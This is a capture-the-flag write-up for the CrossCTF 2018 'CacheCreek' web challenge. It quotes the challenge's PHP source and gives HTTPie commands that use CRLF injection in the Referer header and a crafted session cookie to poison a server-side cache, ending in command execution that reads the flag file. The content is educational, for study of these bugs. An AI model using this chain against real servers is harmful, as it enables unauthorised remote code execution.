
# CrossCTF Finals 2018: CacheCreek (web)

> I wrote a new cache mechanism, it is pretty cool, can you please review it for me?
>
> http://ctf.pwn.sg:8181
>
> Creator - quanyang (@quanyang)

# Challenge

First, we explored the entire source tree. The index and login pages have nothing interesting, but if you put `?source=1` on other pages, you can get the source.

First we find the cache reader, in cache.php: (From now on, we'll omit the unimportant parts)

```
# http://ctf.pwn.sg:8181/cache.php?source=1
...
include_once("./curl.php");
if (isset($_GET['report']) && $_GET['report'] === "debug") {
	$debug = url_get_contents("http://127.0.0.1/internal.php?debug". session_id(), 60, "index.php",['debug'=>'True']);
	echo "debug command: ".htmlentities($debug)."<br/>";
	system($debug);
	echo 'debugged!';
	die();
}

echo "Caching Admin's Profile:<br />";
echo htmlentities(url_get_contents("http://127.0.0.1/internal.php?". session_id(), 60, urldecode($_SERVER['HTTP_REFERER']),['view'=>'admin']));
echo '<br /><br />';
...
```

Cool, it calls system()! There's the interesting file called `curl.php`. Must be some URL fetching tool

```
# http://ctf.pwn.sg:8181/curl.php?source=1
/*
    Adapted from a cache written by Carlo Alberto Ferraris <cafxx@strayorange.com>
*/
function cache($url, $min_expiration, $referer="", $params) {
    $min_expiration = max( intval( $min_expiration ), 1 );
    $cache_key = hash('sha256',$url) or die();
    $cache_file = CACHE_PREFIX . $cache_key;
    $cache_file_fullpath = CACHE_DIR . '/' . $cache_file;
    $cache_file_mtime = @filemtime($cache_file_fullpath);
    // If there's a cached file, this code reads from the file
	...
	// If there isn't, fetch the URL and save to the file
	...
}

function url_get_contents($url, $min_expiration=60, $referer="", $params=Array()) {
    return file_get_contents( cache( $url, $min_expiration, $referer, $params));
}
```

The contents of the thing it puts into `system()`:

```
include_once('./curl.php');
// We haz checks method and referer for security!11
if ($_SERVER['REQUEST_METHOD'] == "POST" && strpos($_SERVER['HTTP_REFERER'], 'index.php') !== False ) {
    if ($_POST['debug'] === "True") {
        // Maybe delete the tmp directory
        echo 'rm -f '. CACHE_DIR . '/'.CACHE_PREFIX.'*';
    } else if (isset($_POST['view'])) {
        $connObj = new dbConn();
        $profile = $connObj->getProfile($_POST['view'])['profile'];
        echo $profile;
    }
} else {
    die("die hax0r!!11");
}
```

This can't be a SQLi thing. This must have something to do with caching as the title suggests. And I noticed that I could inject request body into CURL by setting $referrer to the "rest" of the HTTP request. 

```
export user='dadada' length=11
http -v --form POST http://ctf.pwn.sg:8181/cache.php Referer:"index.php%0D%0AContent-Length%3A%20$length%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0A%0D%0Aview%3D$user"
```

This kinda produces a HTTP request to view any user. I also found out I could modify the request URI by setting SESSID cookie since `session_id()` was put into the request URL: 

```
http -v http://ctf.pwn.sg:8181/cache.php Cookie:PHPSESSID=True%26source%3D1
```

We didn't know how to proceed after this and stared at it for hours. With some luck, we got reminded about cache poisoning! Completely forgot that was a thing. Ugh. 

So the cache function importantly uses the URL to generate the filename to store the file contents. If we could make the debug function in `cache.php` read the wrong cache file, it could execute arbitrary code using system(). 

To exploit this, we have to make it store a cache file maliciously using the profile caching thing (sorry I'm sleepy). That means we have to produce the same URL as the URL that the debug code would look up (`"http://127.0.0.1/internal.php?debug". session_id()`), inside the profile lookup code. 

Since the profile lookup code requsts from `"http://127.0.0.1/internal.php?". session_id()`, we can substitute session_id() for debug and we'll get the same internal URL! 

```
# full cached url would be http://127.0.0.1/internal.php?debug
# Poison cache with profile of "admin"
http -v http://ctf.pwn.sg:8181/cache.php Cookie:PHPSESSID=debug Referer:index.php
# Poison cache with profile of "dadada"
export user='dadada' length=11
http -v --form POST http://ctf.pwn.sg:8181/cache.php Referer:"index.php%0D%0AContent-Length%3A%20$length%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0A%0D%0Aview%3D$user" Cookie:PHPSESSID=debug
```

Now we need to execute that code inside the cached file:

```
# full cached url would be http://127.0.0.1/internal.php?debug
http -v --form POST http://ctf.pwn.sg:8181/cache.php Cookie:PHPSESSID= Referer:index.php report==debug
POST /cache.php?report=debug HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 0
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Cookie: PHPSESSID=
Host: ctf.pwn.sg:8181
Referer: index.php
User-Agent: HTTPie/0.9.9



HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Connection: close
Content-Encoding: gzip
Content-Length: 104
Content-Type: text/html
Date: Mon, 18 Jun 2018 20:01:05 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Server: Apache/2.4.7 (Ubuntu)
Vary: Accept-Encoding
X-Powered-By: PHP/5.5.9-1ubuntu4.25

debug command: cat /flag.txt<br/>CrossCTF{Dont_h@te_tHe_aUth0r_hat3_d@_gam3}
debugged!
```

Yay!
